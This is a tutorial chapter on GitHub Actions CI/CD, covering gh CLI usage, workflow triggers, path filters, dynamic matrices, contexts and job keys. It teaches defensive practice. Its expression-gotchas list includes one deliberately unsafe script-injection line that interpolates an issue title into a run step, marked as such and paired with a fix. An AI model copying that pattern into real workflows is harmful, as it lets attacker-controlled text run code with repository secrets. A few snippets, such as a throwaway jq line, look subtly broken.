# 🐙 CASE 2 — GitHub Actions: Workflows End to End

> **Build a production-grade CI/CD pipeline in GitHub Actions**: path-filtered triggers, a dynamic matrix, five layers of caching, composite actions and reusable workflows, OIDC federation to AWS/Azure/GCP with zero stored secrets, GHCR with provenance and cosign signatures, environments with required reviewers, Dependabot + code scanning + push protection, self-hosted runners on ARC, and a GitOps hand-off to Argo CD.
>
> **Time:** 6–8 hours · **Level:** beginner → confident
> **Prereq:** [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) §1–§4 and §12 read (§12 is *essential* — GitHub Actions has two attacks the other tools don't).
> **What you don't need:** a paid plan. Everything here works on a free GitHub account.

---

## What you'll have at the end

```
✅ A repository with CODEOWNERS, branch protection and secret-scanning push protection
✅ `gh` CLI wired up — creating workflows, runs, environments and secrets from the terminal
✅ A CI workflow with path filters, concurrency cancellation and a dynamic matrix
✅ Five cache layers working, and the cold-vs-warm build time measured
✅ A composite action and a reusable workflow — your own published building blocks
✅ OIDC to AWS, Azure and GCP with ZERO long-lived credentials
✅ Images in GHCR with SBOM, provenance, a cosign signature and an attestations API entry
✅ Environments with required reviewers, deployment branches and a wait timer
✅ A CD workflow that promotes ONE digest dev → staging → production
✅ Dependabot, code scanning (CodeQL + Trivy SARIF upload) and secret scanning
✅ A self-hosted runner, and an ARC runner pool in Kubernetes
✅ The two GitHub-specific attacks demonstrated and defended
✅ 25+ troubleshooting recipes for the failures that actually happen
✅ 5 hands-on tasks with full worked answers
```

---

## 0 · Setup — the repo, the CLI, the local cluster

### 0.1 The account and the limits

```
github.com/3558Bhk  (your account)
  └── shop  (private repository — ⭐ keep it private while learning; see Guide §12)

FREE tier (public repos):        unlimited Actions minutes, unlimited storage
FREE tier (private repos):       2,000 minutes/month, 500 MB storage
                                 ⭐ Windows minutes count 2×, macOS 10×
PRO ($4/month):                  3,000 minutes, 2 GB
TEAM ($4/month/user):            3,000 minutes, 2 GB
ENTERPRISE:                      50,000 minutes, 50 GB

⭐ the free-tier superpower: PUBLIC repos get UNLIMITED minutes.
   A learning project in a public repo costs nothing, ever.
   That's how you should do this case.
```

| Runner | vCPU | RAM | Disk | OS |
|---|---|---|---|---|
| `ubuntu-latest` ⭐ = **Ubuntu 24.04** | 2 | 7 GB | 14 GB SSD | Linux x64 |
| `ubuntu-24.04-arm` | 2 | 7 GB | 14 GB | Linux arm64 |
| `windows-latest` = Server 2025 | 2 | 7 GB | 14 GB | Windows |
| `macos-latest` = macOS 15 (arm64) | 3 | 14 GB | 14 GB | macOS arm64 |
| Larger runners (paid) | 2–64 | 8–1024 GB | up to 6 TB | Linux/Windows |

```bash
# ⭐ verify what you're actually running, every time you're confused
cat > /tmp/probe.yml <<'EOF'
name: probe
on: workflow_dispatch
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "runner:  $RUNNER_OS $RUNNER_ARCH $ImageOS $ImageVersion"
          echo "cpu:     $(nproc)"; free -h; df -h /
          cat /etc/os-release | head -2
          for t in docker buildx java mvn go node npm python3 pip3 kubectl helm \
                   jq yq curl git aws az gh trivy cosign shellcheck hadolint; do
            printf '  %-12s %s\n' "$t" "$(command -v $t >/dev/null && $t --version 2>&1 | head -1 || echo MISSING)"
          done
          echo "--- the GitHub context ---"
          echo '${{ toJSON(github) }}'
          echo "--- env ---"; env | grep -E '^(GITHUB_|RUNNER_)' | sort
EOF
```

### 0.2 The `gh` CLI ⭐ the fastest way to learn Actions

```bash
# ── install ──────────────────────────────────────────────────────
brew install gh                                   # macOS
(type -p wget >/dev/null || sudo apt-get install wget -y) \
  && sudo mkdir -p -m 755 /etc/apt/keyrings \
  && out=$(mktemp) && wget -nv -O$out https://cli.github.com/packages/githubcli-archive-keyring.gpg \
  && cat $out | sudo tee /etc/apt/keyrings/githubcli-archive-keyring.gpg > /dev/null \
  && sudo chmod go+r /etc/apt/keyrings/githubcli-archive-keyring.gpg \
  && echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" \
     | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null \
  && sudo apt update && sudo apt install gh -y

# ── authenticate ─────────────────────────────────────────────────
gh auth login
#   ? What account do you want to log into?  GitHub.com
#   ? What is your preferred protocol for Git operations?  HTTPS
#   ? Authenticate Git with your GitHub credentials?  Yes
#   ? How would you like to authenticate?  Login with a web browser
#   → copy the one-time code, press Enter, paste it in the browser
#   ⭐ select scopes: repo, read:org, workflow, admin:public_key, gist
gh auth status
gh auth token | head -c 12 && echo "…"          # ⭐ the PAT, if you need it for docker

# ── the commands you'll use constantly ───────────────────────────
gh repo list --limit 20
gh repo create shop --private --source=. --remote=origin --push
gh repo clone 3558Bhk/shop && cd shop
gh repo view --web

gh workflow list
gh workflow view ci.yml                          # ⭐ prints the YAML
gh workflow run ci.yml                           # ⭐ trigger workflow_dispatch
gh workflow run ci.yml -f environment=staging -f version=1.4.2 -f skipTests=false
gh workflow run ci.yml --ref feature/x
gh workflow run ci.yml -F services=@services.json
gh run list --workflow ci.yml --limit 10
gh run list --status failure --limit 20
gh run view 1234567890                           # the job list
gh run view 1234567890 --log                     # ⭐ the full log
gh run view 1234567890 --log-failed              # ⭐⭐ only the failed steps
gh run view --job 987654321 --log
gh run view 1234567890 --web
gh run watch 1234567890 --exit-status            # ⭐ block until done; exit code = result
gh run download 1234567890 --name manifests --dir ./dl
gh run rerun 1234567890
gh run rerun 1234567890 --failed                 # ⭐⭐ only the failed jobs
gh run cancel 1234567890
gh run delete 1234567890

gh secret list                                   # repo secrets
gh secret set DB_PASSWORD --body 'x'
gh secret set GHCR_TOKEN < token.txt             # ⭐ from a file, not the shell history
gh secret delete OLD
gh secret list --org
gh secret set ORG_TOKEN --org --visibility selected --repositories shop,other
gh variable list                                 # ⭐ non-secret config
gh variable set GO_VERSION --body '1.23'
gh variable set --env production API_URL --body 'https://api.shop.example.com'

gh environment list
gh environment create production
gh environment view production
gh environment delete old-env
gh secret set SLACK_WEBHOOK --env production --body 'https://hooks.slack.com/…'
gh variable set DEPLOY_WINDOW --env production --body 'Mon-Thu 10:00-17:00 IST'

gh pr list --state open
gh pr create --fill --reviewer sre-lead --draft --label ci
gh pr checks                                     # ⭐ the status of every check on HEAD
gh pr checks --watch --fail-fast
gh pr view 42 --web
gh pr merge 42 --squash --delete-branch
gh pr diff 42

gh api repos/3558Bhk/shop/actions/runs --jq '.workflow_runs[:5] | .[] | {id,name,status,conclusion,run_started_at}'
gh api repos/3558Bhk/shop/environments --jq '.environments[].name'
gh api repos/3558Bhk/shop/dependabot/secrets --jq '.secrets[].name'
gh api repos/3558Bhk/shop/actions/permissions --jq .
gh api repos/3558Bhk/shop/actions/permissions/workflow --jq .
gh api repos/3558Bhk/shop/code-scanning/alerts --jq '.[] | {number,rule:.rule.id,severity:.rule.security_severity_level,state}'

gh attestation verify oci://ghcr.io/3558bhk/shop-api:latest --owner 3558Bhk
gh attestation download oci://ghcr.io/3558bhk/shop-api:latest
gh artifact-attestations …
gh sbom view
```

### 0.3 The repository scaffold

```bash
mkdir -p ~/shop && cd ~/shop
git init -b main

mkdir -p apps/{shop-ui,shop-api,checkout,order-worker,payment-mock} \
         .github/workflows .github/actions/{setup-shop,notify-slack} \
         helm/shop/{templates,values} helm/values k8s scripts ci \
         .github/ISSUE_TEMPLATE

# ⭐ the GitHub-specific configuration files
touch .github/CODEOWNERS
touch .github/dependabot.yml
touch .github/pull_request_template.md
touch .github/workflows/{ci.yml,cd.yml,security.yml,release.yml,nightly.yml}
touch .github/actions/setup-shop/action.yml          # ⭐ a composite action
touch .github/actions/notify-slack/action.yml
touch .github/workflows/reusable-build.yml           # ⭐ a reusable workflow
touch .github/workflows/reusable-deploy.yml

cat > .gitignore <<'EOF'
target/ node_modules/ dist/ build/ __pycache__/ *.class *.jar .venv/
.env .env.* !.env.example
*.tfstate* .terraform/
.DS_Store
EOF

git add -A && git commit -m "chore: initial scaffold"
gh repo create shop --private --source=. --remote=origin --push
# ⭐ switch to public for free unlimited Actions minutes while learning:
# gh repo edit --visibility public --accept-visibility-change-consequences
```

### 0.4 The local cluster and registry

```bash
cat > ci/kind.yaml <<'EOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: cicd
nodes:
  - role: control-plane
    extraPortMappings:
      - {containerPort: 30080, hostPort: 80}
      - {containerPort: 30443, hostPort: 443}
  - role: worker
  - role: worker
EOF
kind create cluster --config ci/kind.yaml --wait 5m
kubectl create namespace shop monitoring
ghcr_login() { echo "$GHCR_PAT" | docker login ghcr.io -u 3558bhk --password-stdin; }
```

---

## 1 · Workflow anatomy

### 1.1 The complete structure, annotated

```yaml
# .github/workflows/ci.yml
# ═══════════════════════════════════════════════════════════════════
# The ONE thing every workflow file must have: `name` and `on`.
# ═══════════════════════════════════════════════════════════════════

name: CI                                    # ⭐ shown in the UI; defaults to the filename

on:                                          # ⭐ `on` is YAML's boolean true!
  push:                                      #    quote it ('on':) if a parser complains
    branches: [main, 'release/**']
    tags: ['v*.*.*']                         # ⭐ tag pushes → the release workflow
    paths:                                   # ⭐⭐ PATH FILTERS — the biggest minute saver
      - 'apps/**'
      - 'helm/**'
      - '.github/workflows/ci.yml'
      - '.github/actions/**'
      - 'scripts/**'
    paths-ignore:                            # ⛔ cannot be combined with `paths` on the
      - '**/*.md'                            #    same event. Use one or the other.
      - 'docs/**'
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened, ready_for_review]   # ⭐ skip drafts
    paths: ['apps/**', 'helm/**', '.github/**', 'scripts/**']
  workflow_dispatch:                          # ⭐ the manual "Run workflow" button
    inputs:
      environment:
        description: '🌍 Target environment'
        required: true
        default: dev
        type: choice
        options: [dev, staging, production]
      skip-tests:
        description: '⚠️ Skip the test job (emergencies only)'
        required: false
        default: false
        type: boolean
      log-level:
        description: 'Log level'
        type: choice
        options: [debug, info, warn]
        default: info
      dry-run:
        description: 'Render and validate, do not apply'
        type: boolean
        default: false
  workflow_call:                              # ⭐⭐ make THIS workflow reusable
    inputs:
      environment: {type: string, required: true}
      revision:      {type: string, required: true}
    secrets:
      registry-token: {required: true}
    outputs:
      image-digest:
        description: 'The digest of the built image'
        value: ${{ jobs.build.outputs.digest }}
  schedule:
    - cron: '0 2 * * 1-5'                     # ⭐⭐ UTC ONLY. 02:00 UTC = 07:30 IST
    - cron: '30 3 * * 6'                      # Saturday 09:00 IST
  release:
    types: [published]                        # ⭐ a GitHub Release was published
  repository_dispatch:
    types: [deploy-trigger]                   # ⭐ triggered by an external API call

# ═══════════════════════════════════════════════════════════════════
permissions:                                 # ⭐⭐ THE MOST IMPORTANT LINE IN THE FILE
  contents: read                             #    least privilege. Never use write-all.
  packages: write                            #    needed to push to GHCR
  id-token: write                            #    ⭐⭐ needed for OIDC federation
  pull-requests: write                       #    needed to comment on PRs
  security-events: write                     #    needed to upload SARIF
  actions: read
  checks: write

env:                                         # ⭐ available to EVERY step of EVERY job
  REGISTRY: ghcr.io
  IMAGE_PREFIX: ghcr.io/3558bhk
  JAVA_VERSION: '21'
  GO_VERSION: '1.23'
  NODE_VERSION: '22'
  PYTHON_VERSION: '3.13'
  HELM_VERSION: v3.16.2
  KIND_VERSION: v0.24.0
  TRIVY_VERSION: 0.58.1
  BUILDKIT_PROGRESS: plain                   # ⭐ readable logs, not the fancy TTY
  DOCKER_BUILDKIT: '1'
  # ⭐ non-secret config that you'd otherwise hardcode:
  # Settings → Secrets and variables → Actions → Variables tab → gh variable set
  CLUSTER_NAME: ${{ vars.CLUSTER_NAME }}

concurrency:                                 # ⭐⭐ cancel superseded runs
  group: ${{ github.workflow }}-${{ github.ref }}     # one group per workflow+branch
  cancel-in-progress: ${{ github.event_name != 'schedule' }}
  # ⭐ cancel-in-progress can be an EXPRESSION. Never cancel a scheduled or
  #    production run, but always cancel a superseded PR run.

defaults:                                    # ⭐ applies to every `run` step
  run:
    shell: bash                              # ⭐ `bash` = `bash -e {0}` (fails on error)
    working-directory: .                     #    `bash --noprofile --norc -eo pipefail {0}`
                                             #    gives you pipefail too

jobs:
  # ══════════════════════════════════════════════════════════════
  changes:                                   # ⭐⭐ the change-detection job
    name: 🔍 What changed?
    runs-on: ubuntu-latest
    timeout-minutes: 5
    outputs:                                 # ⭐⭐ job outputs: the way to pass data on
      shop-api:      ${{ steps.filter.outputs.shop-api }}
      checkout:      ${{ steps.filter.outputs.checkout }}
      order-worker:  ${{ steps.filter.outputs.order-worker }}
      shop-ui:       ${{ steps.filter.outputs.shop-ui }}
      payment-mock:  ${{ steps.filter.outputs.payment-mock }}
      services:      ${{ steps.list.outputs.services }}      # ⭐ a JSON array
      global:        ${{ steps.filter.outputs.global }}
    permissions:
      contents: read
      pull-requests: read                    # ⭐ needed by dorny/paths-filter on PRs
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0                     # ⭐⭐ FULL history — required for the diff

      - uses: dorny/paths-filter@v3          # ⭐ the community standard for this
        id: filter
        with:
          token: ${{ github.token }}
          base: ${{ github.event_name == 'pull_request' && github.event.pull_request.base.sha || github.event.before }}
          filters: |
            global:
              - '.github/workflows/**'
              - '.github/actions/**'
              - 'helm/**'
              - 'k8s/**'
              - 'scripts/**'
              - 'ci/**'
            shop-api:
              - 'apps/shop-api/**'
            checkout:
              - 'apps/checkout/**'
            order-worker:
              - 'apps/order-worker/**'
            shop-ui:
              - 'apps/shop-ui/**'
            payment-mock:
              - 'apps/payment-mock/**'

      - name: Build the service list
        id: list
        run: |
          # ⭐⭐ write JSON to GITHUB_OUTPUT so the matrix can consume it
          if [[ "${{ steps.filter.outputs.global }}" == "true" ]]; then
            echo "  ⭐ a platform-wide path changed — building everything"
            SERVICES='["shop-api","checkout","order-worker","shop-ui","payment-mock"]'
          else
            SERVICES=$(jq -cn --argjson a "${{ steps.filter.outputs.shop-api == 'true' }}" \
              '[ ($a|select(.)) ] ' >/dev/null; echo '[]')
            SERVICES=$(jq -cn \
              --argjson s "${{ steps.filter.outputs.shop-api }}" \
              --argjson c "${{ steps.filter.outputs.checkout }}" \
              --argjson o "${{ steps.filter.outputs.order-worker }}" \
              --argjson u "${{ steps.filter.outputs.shop-ui }}" \
              --argjson p "${{ steps.filter.outputs.payment-mock }}" \
              '[ (if $s=="true" then "shop-api" else empty end),
                 (if $c=="true" then "checkout" else empty end),
                 (if $o=="true" then "order-worker" else empty end),
                 (if $u=="true" then "shop-ui" else empty end),
                 (if $p=="true" then "payment-mock" else empty end) ]')
          fi
          echo "services=$SERVICES"
          echo "services=$SERVICES" >> "$GITHUB_OUTPUT"
          echo "count=$(echo "$SERVICES" | jq 'length')" >> "$GITHUB_OUTPUT"

      # ⭐⭐ the SAFER version of the above — no untrusted interpolation:
      - name: Build the service list (the safe way)
        id: safe_list
        if: always()
        env:
          F_GLOBAL: ${{ steps.filter.outputs.global }}
          F_API:    ${{ steps.filter.outputs.shop-api }}
          F_CHECK:  ${{ steps.filter.outputs.checkout }}
          F_WORKER: ${{ steps.filter.outputs.order-worker }}
          F_UI:     ${{ steps.filter.outputs.shop-ui }}
          F_PAY:    ${{ steps.filter.outputs.payment-mock }}
        run: |
          set -euo pipefail
          if [[ "$F_GLOBAL" == "true" ]]; then
            SERVICES='["shop-api","checkout","order-worker","shop-ui","payment-mock"]'
            echo "::notice::a platform-wide path changed — building everything"
          else
            SERVICES=$(jq -cn \
              '[ (if env.F_API    == "true" then "shop-api"      else empty end),
                 (if env.F_CHECK  == "true" then "checkout"      else empty end),
                 (if env.F_WORKER == "true" then "order-worker"  else empty end),
                 (if env.F_UI     == "true" then "shop-ui"       else empty end),
                 (if env.F_PAY    == "true" then "payment-mock"  else empty end) ]')
          fi
          echo "  services: $SERVICES"
          {
            echo "services=$SERVICES"
            echo "count=$(echo "$SERVICES" | jq 'length')"
          } >> "$GITHUB_OUTPUT"
          # ⭐ and a human-readable job summary
          {
            echo "## 🔍 Changed services"
            echo
            echo "| Service | Build? |"
            echo "|---|---|"
            for s in shop-api checkout order-worker shop-ui payment-mock; do
              if echo "$SERVICES" | jq -e --arg s "$s" 'index($s)' >/dev/null; then
                echo "| \`$s\` | ✅ yes |"
              else
                echo "| \`$s\` | ⏭ skipped |"
              fi
            done
          } >> "$GITHUB_STEP_SUMMARY"

  # ══════════════════════════════════════════════════════════════
  lint:
    name: 🔎 Lint everything
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/setup-shop        # ⭐ your composite action (§6.1)
      - name: Shellcheck
        run: |
          set -euo pipefail
          find . -name '*.sh' -not -path './node_modules/*' -exec shellcheck -x {} +
      - name: Hadolint (Dockerfiles)
        uses: hadolint/hadolint-action@v3.1.0
        with:
          dockerfile: Dockerfile
          recursive: true
          failure-threshold: error
          ignore: DL3008,DL3018              # apt/yum version pinning
      - name: Yamllint
        run: yamllint -d "{extends: relaxed, rules: {line-length: disable}}" .
      - name: Actionlint ⭐ (lints THIS workflow)
        uses: rhysd/actionlint@v1.7.7
        with:
          shellcheck: true
      - name: Kubeconform
        run: |
          kubeconform -strict -summary -ignore-missing-schemas k8s/
      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}   # required for orgs

  # ══════════════════════════════════════════════════════════════
  test:
    name: 🧪 ${{ matrix.service }} (${{ matrix.language }})
    needs: changes                            # ⭐⭐ `needs` = the DAG edge
    if: |
      always() && needs.changes.result == 'success' &&
      needs.changes.outputs.count != '0' &&
      !contains(fromJSON(needs.changes.outputs.services), '') == false
    runs-on: ${{ matrix.os }}
    timeout-minutes: ${{ matrix.timeout }}
    permissions:
      contents: read
    strategy:
      fail-fast: false                        # ⭐⭐ DON'T cancel the others on one failure
      max-parallel: 4                         # ⭐ throttle concurrency
      matrix:
        # ⭐⭐ a DYNAMIC matrix, from the previous job's output
        service: ${{ fromJSON(needs.changes.outputs.services) }}
        include:                              # ⭐ per-service overrides
          - service: shop-api
            language: java
            os: ubuntu-latest
            timeout: 25
          - service: checkout
            language: go
            os: ubuntu-latest
            timeout: 15
          - service: order-worker
            language: python
            os: ubuntu-latest
            timeout: 15
          - service: shop-ui
            language: node
            os: ubuntu-latest
            timeout: 20
          - service: payment-mock
            language: go
            os: ubuntu-latest
            timeout: 15
    env:
      SERVICE: ${{ matrix.service }}
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/setup-shop
        with:
          language: ${{ matrix.language }}
      - name: Test
        run: ./ci/test-${{ matrix.language }}.sh "$SERVICE"
      - name: Publish the test results
        if: always()                          # ⭐⭐ ALWAYS — even when tests fail
        uses: actions/upload-artifact@v4
        with:
          name: tests-${{ matrix.service }}
          path: |
            apps/${{ matrix.service }}/**/TEST-*.xml
            apps/${{ matrix.service }}/**/junit-*.xml
          if-no-files-found: warn
          retention-days: 14
      - name: Publish coverage
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ matrix.service }}
          path: apps/${{ matrix.service }}/**/coverage.xml
      - name: Annotate failures on the PR ⭐
        if: failure()
        uses: dorny/test-reporter@v1
        with:
          name: '${{ matrix.service }} tests'
          path: 'apps/${{ matrix.service }}/**/TEST-*.xml'
          reporter: java-junit
          fail-on-error: false
          list-suites: failed
          list-tests: failed

  # ══════════════════════════════════════════════════════════════
  report:
    name: 📊 Aggregate
    needs: [changes, test]
    if: always()
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/download-artifact@v4
        with:
          pattern: tests-*
          path: all-tests
          merge-multiple: true                # ⭐ merge the per-service dirs into one
      - name: Merge the JUnit XML
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import glob, xml.etree.ElementTree as ET
          root = ET.Element('testsuites')
          for f in sorted(glob.glob('all-tests/**/*.xml', recursive=True)):
              t = ET.parse(f).getroot()
              root.append(t if t.tag == 'testsuite' else t)
              print('  merged', f)
          ET.ElementTree(root).write('merged.xml')
          s = root.attrib
          print(f"  totals: tests={s.get('tests')} failures={s.get('failures')} errors={s.get('errors')}")
          PY
      - name: Upload the merged report
        uses: actions/upload-artifact@v4
        with: {name: merged-test-report, path: merged.xml}
```

### 1.2 The `on:` triggers, completely

| Trigger | Fires when | Key facts |
|---|---|---|
| `push` | a commit lands on a branch/tag | `paths`/`paths-ignore`/`branches`/`tags` filters. `github.event.before` = the previous SHA |
| `pull_request` ⭐ | a PR is opened, updated, reopened | ⭐⭐ Runs from the **merge commit**, with the **base branch's workflow file**. Secrets ARE available (same repo only). This is the safe default. |
| `pull_request_target` | the same | ⚠️⛔ Runs from the **BASE branch's** workflow with **WRITE** permissions and **full secret access** to code from the PR head. This is the *pwn request* vector — see Guide §12.1 |
| `workflow_dispatch` | a human clicks "Run workflow" | ⭐ typed `inputs:`; also triggerable via `gh workflow run` and the REST API |
| `workflow_call` | another workflow calls this one | ⭐ reusable workflows. Typed `inputs`, `secrets`, `outputs` |
| `schedule` | cron | ⭐⭐ **UTC only**. May be delayed 15–60 min under load. Does NOT run on a repo inactive for 60 days. Runs on the **default branch's** workflow file only. |
| `repository_dispatch` | an external POST to the API | ⭐ the GitOps/webhook entry point |
| `release` | a GitHub Release is created/published | |
| `issues` / `issue_comment` | issue events | ⚠️ untrusted input |
| `deployment_status` | a deployment's status changed | |
| `workflow_run` ⭐ | another workflow completed | ⭐⭐ the **cross-workflow** pattern. Runs on the DEFAULT branch with full permissions, and receives untrusted data. Dangerous — see Guide §12.1 |
| `merge_group` | a merge queue group | ⭐ pairs with the GitHub merge queue |
| `create` / `delete` | a branch/tag created/deleted | |
| `label` / `milestone` / `project_card` | … | rarely useful in CI |

```yaml
# ⭐ the `workflow_run` pattern — the ONLY way to make a PR build push to a registry
on:
  workflow_run:
    workflows: ['CI']                 # ⭐ the NAME, not the file
    types: [completed]
    branches: [main]
jobs:
  deploy:
    if: github.event.workflow_run.conclusion == 'success'    # ⭐⭐ gate on the result
    runs-on: ubuntu-latest
    steps:
      - name: Download the artifact FROM THE OTHER RUN
        uses: actions/download-artifact@v4
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          run-id: ${{ github.event.workflow_run.id }}        # ⭐⭐ the triggering run
          name: image-info
      # ⚠️⛔ SECURITY: this workflow runs with DEFAULT-BRANCH code and FULL secrets,
      #   but the ARTIFACT came from an untrusted PR build. Never execute anything
      #   from that artifact. Treat it as data only. Verify a signature if you must use it.
```

### 1.3 Contexts and expressions ⭐⭐

```
${{ <context>.<property> }}     evaluated at DIFFERENT times depending on the key
```

| Context | Available in | Contains |
|---|---|---|
| `github` | everywhere | ⭐ the event payload, the repo, the ref, the sha, the actor, the run id |
| `env` | workflow / job / step | the merged environment variables |
| `vars` ⭐ | workflow / job / step | ⭐ **configuration variables** (non-secret, set in the UI/CLI) |
| `secrets` | workflow / job / step | ⭐ secrets. `secrets.GITHUB_TOKEN` is automatic |
| `inputs` | `workflow_dispatch` / `workflow_call` | the typed inputs |
| `matrix` | jobs with a matrix | the current matrix combination |
| `job` | steps | `job.status` |
| `runner` | steps | `runner.os`, `runner.arch`, `runner.temp`, `runner.tool_cache` |
| `needs` | jobs after the dependency | ⭐ `needs.<job>.outputs.x`, `needs.<job>.result` |
| `steps` | steps after the one | ⭐ `steps.<id>.outputs.x`, `steps.<id>.outcome`, `steps.<id>.conclusion` |
| `strategy` | jobs with a matrix | `strategy.fail-fast`, `strategy.job-index`, `strategy.job-total` |
| `hashFiles` | a function | ⭐ `hashFiles('**/package-lock.json')` → a stable hash for cache keys |

```yaml
# ⭐ the `github` context — the fields you'll actually use
github.repository            # 3558Bhk/shop
github.repository_owner      # 3558Bhk
github.repository_owner_id
github.ref                   # refs/heads/main | refs/pull/42/merge | refs/tags/v1.4.2
github.ref_name              # main | 42/merge | v1.4.2
github.ref_type              # branch | tag
github.head_ref              # ⭐ the PR's SOURCE branch (only on pull_request)
github.base_ref              # ⭐ the PR's TARGET branch (only on pull_request)
github.sha                   # the commit SHA
github.event_name            # push | pull_request | workflow_dispatch | schedule | …
github.event.action          # opened | synchronize | … (only for some events)
github.actor                 # ⭐ who triggered it — UNTRUSTED on a PR
github.triggering_actor
github.run_id                # 1234567890
github.run_number            # 47
github.run_attempt           # 1
github.workflow              # CI
github.workflow_ref          # 3558Bhk/shop/.github/workflows/ci.yml@refs/heads/main
github.workflow_sha
github.job
github.server_url            # https://github.com
github.api_url
github.token                 # ⭐⭐ == secrets.GITHUB_TOKEN
github.event                 # ⭐⭐ the FULL event payload — treat as UNTRUSTED
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.repo.full_name    # ⭐ is it a fork?
github.event.pull_request.head.sha
github.event.issue.title
github.event.comment.body
github.event.inputs.environment                    # for workflow_dispatch (legacy)
github.event.client_payload.*                      # for repository_dispatch

# ⭐⭐ the ones that decide whether you may trust the code
github.event.pull_request.head.repo.full_name != github.repository   # → it's a fork
github.event_name == 'pull_request' && github.event.pull_request.head.repo.fork
```

**The functions:**

```
contains('Hello world', 'world')          → true
contains(fromJSON('["a","b"]'), 'a')      → true   ⭐ works on arrays
startsWith('refs/heads/main', 'refs/')    → true
endsWith('v1.4.2', '.2')                  → true
format('{0} {1}', 'a', 'b')               → 'a b'
join(matrix.os, '-')                      → 'ubuntu-latest'
fromJSON('[1,2,3]')                       → an array  ⭐⭐ the matrix unlock
toJSON(github.event)                      → a JSON string
hashFiles('**/go.sum')                    → 'a1b2c3…'  ⭐⭐ the cache-key unlock
hashFiles('apps/${{ matrix.service }}/**') → per-service hash
success() failed() cancelled() always()   → job/step status
```

```yaml
# ⭐⭐ expression gotchas that bite everyone
# 1. `always()` INCLUDES cancelled runs. Use it for cleanup, never for "did it work?"
if: always()                       # runs even if the workflow was cancelled
if: '!cancelled()'                 # ⭐ runs unless cancelled — usually what you want
if: always() && !cancelled()

# 2. a step's `outcome` vs its `conclusion`
#    outcome    = the result IGNORING `continue-on-error`   (success|failure|cancelled|skipped)
#    conclusion = the result AFTER `continue-on-error`      (success|failure|cancelled|skipped)
- run: exit 1
  id: risky
  continue-on-error: true
- run: echo "outcome=${{ steps.risky.outcome }} conclusion=${{ steps.risky.conclusion }}"
  # outcome=failure  conclusion=success     ⭐ the difference matters for gates

# 3. an empty string is truthy in some comparisons
if: ${{ steps.x.outputs.flag }}            # ⛔ '' → skipped, 'false' → RUNS (non-empty!)
if: ${{ steps.x.outputs.flag == 'true' }}  # ✅ explicit

# 4. ⛔ you cannot use ${{ }} inside a `run:` script's shell syntax safely
- run: echo "${{ github.event.issue.title }}"    # ⛔ SCRIPT INJECTION — Guide §12.2
- run: echo "$TITLE"                              # ✅
  env: {TITLE: ${{ github.event.issue.title }}}

# 5. the `env:` context is NOT available in a job's `if:` at the workflow level
#    `vars` and `secrets` ARE.

# 6. a matrix's `include` can ADD combinations, not just override
strategy:
  matrix:
    os: [ubuntu-latest]
    version: ['17', '21']
    include:
      - {os: macos-latest, version: '21'}     # ⭐ ADDS a third combination
```

### 1.4 Job and step keys

```yaml
jobs:
  build:
    name: 🏗️ Build shop-api               # ⭐ the display name
    runs-on: ubuntu-latest                  # ⭐ or: [self-hosted, linux, x64] (labels)
                                            #   or: ubuntu-latest-16-cores (larger)
                                            #   or: ${{ matrix.os }}
    needs: [lint, changes]                  # ⭐ the DAG
    if: github.event_name != 'schedule'     # ⭐ the gate
    timeout-minutes: 30                     # ⭐⭐ ALWAYS set this. Default is 360!
    permissions:                            # ⭐ per-job, overrides the workflow-level
      contents: read
      id-token: write
    environment:                            # ⭐⭐ the deployment gate
      name: production
      url: https://shop.example.com          # shown as a link in the UI
    concurrency:                            # ⭐ per-job concurrency
      group: deploy-${{ github.ref }}
      cancel-in-progress: false
    defaults:
      run: {shell: bash, working-directory: apps/shop-api}
    env:
      SERVICE: shop-api
    outputs:                                # ⭐⭐ job outputs
      digest: ${{ steps.build.outputs.digest }}
      version: ${{ steps.meta.outputs.version }}
    services:                               # ⭐ sidecar containers
      postgres:
        image: postgres:17-alpine
        env: {POSTGRES_PASSWORD: shop, POSTGRES_DB: shop}
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 10s --health-timeout 5s --health-retries 5
      redis:
        image: redis:7-alpine
        ports: ['6379:6379']
        options: --entrypoint redis-server
    container:                              # ⭐ run the WHOLE job in a container
      image: maven:3.9-eclipse-temurin-21
      credentials:
        username: ${{ github.actor }}
        password: ${{ secrets.GHCR_TOKEN }}
      env: {MAVEN_OPTS: '-Dmaven.repo.local=/github/home/.m2'}
      options: '--cpus 3 --memory 6g'
      volumes: ['/var/run/docker.sock:/var/run/docker.sock']   # ⛔ only if you must
    steps:
      - name: Checkout                      # ⭐ every step should have a name
        uses: actions/checkout@v7           # ⭐⭐ an action — PINNED to a major version
        with:
          fetch-depth: 0
          lfs: true
          submodules: recursive
          persist-credentials: true         # ⭐ keeps the token for a later `git push`
          clean: true
          ref: ${{ github.event.pull_request.head.sha }}   # ⚠️ see Guide §12.1

      - name: A shell step
        id: meta                            # ⭐⭐ required to read its outputs
        run: |
          set -euo pipefail
          VERSION=$(git describe --tags --always --dirty)
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"      # ⭐⭐ the output mechanism
          echo "DATE=$(date -u +%FT%TZ)" >> "$GITHUB_ENV"  # ⭐ sets an env var for LATER steps
          echo "$VERSION" > version.txt                    # ⭐ a file for later steps
          echo "### Version" >> "$GITHUB_STEP_SUMMARY"     # ⭐ the run summary page
          echo "\`$VERSION\`" >> "$GITHUB_STEP_SUMMARY"
          echo "::notice::the version is $VERSION"          # ⭐ an annotation in the UI
